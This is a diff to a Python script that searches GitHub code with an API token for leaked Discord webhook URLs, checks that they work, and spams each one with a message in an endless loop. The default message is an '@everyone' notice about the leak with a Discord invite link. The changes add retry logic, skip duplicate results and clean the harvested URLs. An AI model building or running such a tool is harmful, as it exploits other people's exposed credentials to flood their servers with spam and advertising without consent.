@@ -1,5 +1,6 @@
 from discord_webhook import DiscordWebhook
 import re
+import os
 import requests
 import time
 from colorama import Fore, Style, init
@@ -10,6 +11,14 @@ from __secrets__ import GH_TOKEN
 init(autoreset=True)
 
 GITHUB_URL = "https://api.github.com/search/code"
+
+
+class DataStorage:
+    def __init__(self):
+        self.last = ""
+
+
+data_storage = DataStorage()
 
 
 def is_valid_webhook(url: str) -> bool:
@@ -63,7 +72,18 @@ def get_result() -> Optional[str]:
         print(f"{Fore.MAGENTA}Done sleeping, retrying")
         return get_result()
 
-    url = data["items"][0]["html_url"]
+    try:
+        url = data["items"][0]["html_url"]
+    except IndexError:
+        print(f"{Fore.LIGHTMAGENTA_EX}Github sent no items, retrying in 30 seconds")
+        time.sleep(30)
+        print(f"{Fore.MAGENTA}Done sleeping, retrying")
+        return get_result()
+
+    if url == data_storage.last:
+        return
+    else:
+        data_storage.last = url
 
     raw_url = url.replace("github.com", "raw.githubusercontent.com").replace(
         "/blob", ""
@@ -86,6 +106,12 @@ def loop(msg: str, amount: int):
 
     webhook_url = found[0]
 
+    TO_REMOVE = ('"', "'")
+
+    if webhook_url.endswith(TO_REMOVE):
+        for item in TO_REMOVE:
+            webhook_url = webhook_url.removesuffix(item)
+
     print(f"{Fore.GREEN}Found {Style.RESET_ALL}{webhook_url}")
 
     if is_valid_webhook(webhook_url):
@@ -104,24 +130,32 @@ def ask(msg, convertor):
 
 def main():
     os.system('cls' if os.name == 'nt' else 'clear')
-    print(f'{Fore.CYAN}\r\n\n                       ▄▀▄     ▄▀▄' + "\n"
-      '                      ▄█░░▀▀▀▀▀░░█▄' + "\n"
-      '                  ▄▄  █░░░░░░░░░░░█' + "\n"
-      '                 █▄▄█ █░░▀░░┬░░▀░░█ █▄▄█' + "\n"
-      "\n"
-      "                 Author: Kars#9142\n"
-      "                 GitHub: https://github.com/ArabicCat\n"
-      "                 Credits: Thanks to cibere#0001 for create the automated version!\n\n")
+    print(
+        f"{Fore.CYAN}\r\n\n                       ▄▀▄     ▄▀▄" + "\n"
+        "                      ▄█░░▀▀▀▀▀░░█▄" + "\n"
+        "                  ▄▄  █░░░░░░░░░░░█" + "\n"
+        "                 █▄▄█ █░░▀░░┬░░▀░░█ █▄▄█" + "\n"
+        "\n"
+        "                 Author: Kars#9142\n"
+        "                 GitHub: https://github.com/ArabicCat\n"
+        "                 Credits: Thanks to cibere#0001 for create the automated version!\n\n"
+    )
 
-    msg = input(f"{Fore.GREEN}Enter the message you wanna spam (leave empty for default)\n> ")
-    amount = ask(f"{Fore.GREEN}\nEnter the amount you wanna spam the message (25+ = RATELIMMITED)\n> ", int)
+    msg = input(
+        f"{Fore.GREEN}Enter the message you wanna spam (leave empty for default)\n> "
+    )
+    amount = ask(
+        f"{Fore.GREEN}\nEnter the amount you wanna spam the message (25+ = RATELIMMITED)\n> ",
+        int,
+    )
 
     if not msg:
         msg = "@everyone it seems someone leaked your webhook url!!! https://discord.gg/DM8GtTT4rX"
 
     while True:
         loop(msg, amount)
-        time.sleep(50)
+        time.sleep(30)
+
 
 if __name__ == "__main__":
     main()
